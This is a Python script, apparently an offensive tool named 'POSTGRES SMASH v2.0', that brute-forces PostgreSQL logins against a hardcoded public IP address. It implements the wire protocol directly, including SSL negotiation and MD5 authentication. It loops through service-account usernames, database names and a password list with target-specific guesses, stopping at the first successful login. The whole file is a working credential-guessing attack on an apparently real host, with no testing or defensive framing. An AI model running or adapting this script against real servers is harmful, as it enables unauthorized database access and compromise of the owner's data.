import socket
import ssl
import struct
import hashlib
import sys
import time

TARGET_IP = "79.137.248.131"
PORT = 5432
USERS = ["gitea", "forgejo", "git", "code", "postgres", "orehus"]
DATABASES = ["gitea", "forgejo", "git", "code", "postgres", "template1"]
PASSWORDS = ["zalupa", "Zalupa", "zalupa123", "zalupa2025", "zalupa2026", "zalupahack", "orehus", "postgres", "secret"]

def try_login(user, password, db):
    # print(f"[*] Trying {user}:{password}@{db}...", end='') # Too verbose
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET_IP, PORT))
        
        ssl_req = struct.pack('!II', 8, 80877103)
        sock.sendall(ssl_req)
        resp = sock.recv(1)
        
        if resp == b'S':
            wrapped_sock = ssl.wrap_socket(sock)
        elif resp == b'N':
            wrapped_sock = sock
        else:
            sock.close()
            return False

        startup = create_startup_message(user, db)
        wrapped_sock.sendall(startup)
        
        header = wrapped_sock.recv(5)
        if not header:
            wrapped_sock.close()
            return False
            
        msg_type, length = struct.unpack('!cI', header)
        
        if msg_type == b'R':
            auth_type_data = wrapped_sock.recv(length - 4)
            auth_type = struct.unpack('!I', auth_type_data[0:4])[0]
            
            if auth_type == 0:
                print(f" \033[92m[SUCCESS] {user}:{password}@{db} (No Pass)\033[0m")
                return True
            elif auth_type == 3: # Cleartext
                pwd_packet = get_pg_message(b'p', password.encode() + b'\x00')
                wrapped_sock.sendall(pwd_packet)
            elif auth_type == 5: # MD5
                salt = auth_type_data[4:8]
                m1 = hashlib.md5(password.encode() + user.encode()).hexdigest()
                m2 = hashlib.md5(m1.encode() + salt).hexdigest()
                res = "md5" + m2
                pwd_packet = get_pg_message(b'p', res.encode() + b'\x00')
                wrapped_sock.sendall(pwd_packet)
            else:
                wrapped_sock.close()
                return False
                
            # Final Check
            while True:
                resp_header = wrapped_sock.recv(1)
                if not resp_header: break
                if resp_header == b'R':
                    res_len = struct.unpack('!I', wrapped_sock.recv(4))[0]
                    auth_res = struct.unpack('!I', wrapped_sock.recv(4))[0]
                    if auth_res == 0:
                        print(f" \033[92m[SUCCESS] {user}:{password}@{db}\033[0m")
                        return True
                    else:
                        break
                elif resp_header == b'E':
                    # Parse Error Field to distinguish "Invalid Password" vs "Invalid DB"
                    # But for speed, we just assume failed
                    break
                    
        elif msg_type == b'E':
            pass # Invalid DB or User

        wrapped_sock.close()
    except:
        pass
    return False

print("--- POSTGRES SMASH v2.0 (Service Accounts) ---")
for u in USERS:
    for db in DATABASES:
        # Check if DB/User exists first (with dummy pass)
        # Optimization: We just bruteforce everything
        for p in PASSWORDS:
            if try_login(u, p, db):
                sys.exit(0)
            print(".", end='', flush=True) # Progress bar
        print(f" [Done {u}@{db}]")
